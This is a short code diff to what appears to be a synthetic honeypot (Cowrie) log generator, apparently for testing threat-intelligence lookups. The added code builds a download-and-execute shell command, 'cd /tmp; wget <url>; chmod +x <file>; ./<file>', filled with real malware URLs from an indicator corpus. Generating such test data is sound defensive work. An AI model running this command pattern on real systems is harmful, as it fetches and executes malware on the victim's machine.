@@ -43,8 +43,13 @@ def generate(corpus, ip_rec: dict, dst_ip: str) -> tuple[str, dict]:
             "message": "login attempt succeeded",
         })
     elif roll < 0.95:
-        # コマンド入力（recon / バックドア注入チェーン）
-        cmd = random.choice(c["commands"])
+        # コマンド入力。30%は本物のマルウェアURLを使った検体DLコマンド（GTIがURL/ドメイン照会）
+        ioc = corpus.pick_url_ioc() if random.random() < 0.30 else None
+        if ioc and ioc.get("url"):
+            fn = ioc.get("filename") or "x"
+            cmd = "cd /tmp; wget {0}; chmod +x {1}; ./{1}".format(ioc["url"], fn)
+        else:
+            cmd = random.choice(c["commands"])
         base.update({
             "eventid": "cowrie.command.input",
             "input": cmd,
